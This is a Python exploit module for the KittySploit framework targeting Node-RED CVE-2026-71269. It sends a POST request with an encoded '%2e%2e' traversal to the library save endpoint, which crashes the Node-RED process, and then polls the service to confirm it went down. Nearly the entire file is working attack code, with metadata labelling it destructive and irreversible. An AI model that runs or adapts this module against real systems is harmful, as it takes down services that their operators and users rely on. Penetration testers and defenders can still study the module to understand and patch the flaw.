#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-71269 — Node-RED library save path unhandled rejection DoS."""

import socket
import time

import requests

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.target_utils import normalize_scanner_target


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Node-RED Library DoS (CVE-2026-71269)",
        "description": (
            "CVE-2026-71269 in Node-RED 3.0.0–5.0.4 on Node.js >= 15: POST "
            "/library/local/<type>/%2e%2e makes saveLibraryEntry() write to the library "
            "directory itself; the discarded util.writeFile() EISDIR rejection becomes an "
            "uncaught exception and Node-RED exits. The HTTP layer answers 204 before the "
            "crash. DESTRUCTIVE: a successful run terminates the Node-RED process until "
            "restarted. Does not attempt file read, write beyond the trigger, or code execution."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-71269"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-71269",
            "https://www.cve.org/CVERecord?id=CVE-2026-71269",
        ],
        "tags": [
            "node-red",
            "nodered",
            "dos",
            "library",
            "unauthenticated",
            "cve-2026-71269",
            "auxiliary",
        ],
        "agent": {
            "risk": "critical",
            "effects": ["active_exploitation", "denial_of_service"],
            "expected_requests": 3,
            "reversible": False,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "cost": 1.0,
            "noise": 0.8,
            "value": 0.9,
            "requires": {
                "tech_hints_any": ["node-red", "nodered"],
                "endpoint_pattern_any": ["/library/local/"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "dos", "from_detail": "process exit via library save"},
                ],
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(1880, "Node-RED HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    token = OptString(
        "",
        "Bearer token with library.write scope if adminAuth is configured",
        False,
        advanced=True,
    )
    confirm_window = OptFloat(
        20.0,
        "Seconds to watch service liveness after the trigger",
        False,
        advanced=True,
    )

    TRAVERSAL = "%2e%2e"
    LIB_TYPES = ("functions", "templates")
    TRIGGER_BODY = {"text": "x"}

    def _host(self) -> str:
        target = str(self.target or "").strip()
        host, _, _ = normalize_scanner_target(target)
        return host or target

    def _admin_path(self, suffix: str) -> str:
        base = (self.path or "/").rstrip("/")
        if not suffix.startswith("/"):
            suffix = f"/{suffix}"
        return f"{base}{suffix}" if base else suffix

    def _base_url(self) -> str:
        port = int(self.port or 1880)
        proto = "https" if self._to_bool(self.ssl) else "http"
        return f"{proto}://{self._host()}:{port}"

    def _auth_headers(self) -> dict:
        headers = {"Accept": "application/json"}
        token = str(self.token or "").strip()
        if token:
            headers["Authorization"] = f"Bearer {token}"
        return headers

    def _request_url(self, method: str, path_suffix: str, timeout: float):
        url = self._base_url() + self._admin_path(path_suffix)
        verify = self._to_bool(getattr(self, "verify_ssl", False))
        kwargs = {"headers": self._auth_headers(), "timeout": timeout, "verify": verify}
        proxy = str(getattr(self, "proxy", "") or "").strip()
        if hasattr(self.proxy, "value"):
            proxy = str(self.proxy.value or "").strip()
        if proxy:
            kwargs["proxies"] = {"http": proxy, "https": proxy}
        try:
            if method.upper() == "GET":
                return requests.get(url, **kwargs)
            return requests.post(url, json=self.TRIGGER_BODY, **kwargs)
        except requests.RequestException as exc:
            return exc

    def _tcp_alive(self, timeout: float = 3.0) -> bool:
        try:
            sock = socket.create_connection((self._host(), int(self.port or 1880)), timeout=timeout)
            sock.close()
            return True
        except OSError:
            return False

    def _fire(self, lib_type: str):
        path = f"/library/local/{lib_type}/{self.TRAVERSAL}"
        result = self._request_url("POST", path, timeout=10.0)
        if isinstance(result, requests.RequestException):
            return None, f"{result.__class__.__name__}: {result}"
        return int(result.status_code or 0), result.text or ""

    def _watch_liveness(self, window: float):
        died = False
        recovered = False
        timeline = []
        deadline = time.time() + window
        while time.time() < deadline:
            elapsed = round(window - (deadline - time.time()), 1)
            if not self._tcp_alive(timeout=2.0):
                state = "connection refused"
                if not died:
                    died = True
            else:
                probe = self._request_url(
                    "GET", "/library/local/flows", timeout=5.0
                )
                if isinstance(probe, requests.RequestException):
                    state = f"no HTTP response ({probe.__class__.__name__})"
                    if not died:
                        died = True
                else:
                    state = f"HTTP {int(probe.status_code or 0)}"
                    if died:
                        recovered = True
            timeline.append((elapsed, state))
            if died and recovered:
                break
            time.sleep(1.0)
        return died, recovered, timeline

    def check(self):
        probe = self._request_url("GET", "/library/local/flows", timeout=8.0)
        if isinstance(probe, requests.RequestException):
            return {
                "vulnerable": False,
                "reason": f"unreachable ({probe.__class__.__name__})",
                "confidence": "low",
            }
        code = int(probe.status_code or 0)
        if code == 401:
            token = str(self.token or "").strip()
            if not token:
                return {
                    "vulnerable": False,
                    "reason": "401 — adminAuth configured; set token",
                    "confidence": "medium",
                }
        if code != 200:
            return {
                "vulnerable": False,
                "reason": f"library API returned HTTP {code}, not Node-RED admin",
                "confidence": "medium",
            }
        return {
            "vulnerable": True,
            "reason": "Node-RED library API reachable",
            "confidence": "medium",
        }

    def run(self):
        try:
            print_status("CVE-2026-71269 — Node-RED library save DoS")
            print_warning(
                "DESTRUCTIVE: a successful run terminates the Node-RED process"
            )

            result = self.check()
            if not result.get("vulnerable"):
                print_error(result.get("reason", "Target does not appear exploitable"))
                return False

            print_success(result.get("reason", "Target appears exploitable"))
            print_status(
                f"Baseline GET {self._admin_path('/library/local/flows')} — HTTP 200"
            )

            fired_type = None
            fire_status = None
            fire_body = ""
            for lib_type in self.LIB_TYPES:
                print_status(
                    f"Trigger POST {self._admin_path(f'/library/local/{lib_type}/{self.TRAVERSAL}')}"
                )
                fire_status, fire_body = self._fire(lib_type)
                if fire_status is None:
                    print_info(f"Socket dropped mid-request: {fire_body}")
                    fired_type = lib_type
                    break
                print_info(f"  HTTP {fire_status}")
                if fire_status == 204:
                    fired_type = lib_type
                    break
                if fire_status == 400 and "Unknown library type" in fire_body:
                    continue
                if fire_status == 403:
                    print_error(
                        "403 — is_malicious() rejected the path (expected bare %2e%2e)"
                    )
                    return False
                if fire_status == 401:
                    print_error("401 — supply a Bearer token with library.write scope")
                    return False

            if fired_type is None:
                print_error(
                    f"No writable library type accepted the trigger (HTTP {fire_status})"
                )
                return False

            if fire_status == 204:
                print_info(
                    f"HTTP 204 from library type '{fired_type}' — watching liveness"
                )

            window = float(self.confirm_window or 20.0)
            time.sleep(1.5)
            print_status(f"Watching service for {int(window)}s post-trigger")
            died, recovered, timeline = self._watch_liveness(window)

            for elapsed, state in timeline:
                print_info(f"  t+{elapsed:>5}s  {state}")

            if died and recovered:
                print_success(
                    "CRASH CONFIRMED — process exited and was restarted by a supervisor"
                )
                return True
            if died:
                print_success(
                    "CRASH CONFIRMED — service went down after trigger and stayed down"
                )
                return True

            print_error(
                "Trigger accepted but service stayed up "
                "(Node.js <= 14, patched, or path rewritten by proxy)"
            )
            return False

        except Exception as exc:
            print_error(f"Module failed: {exc}")
            return False
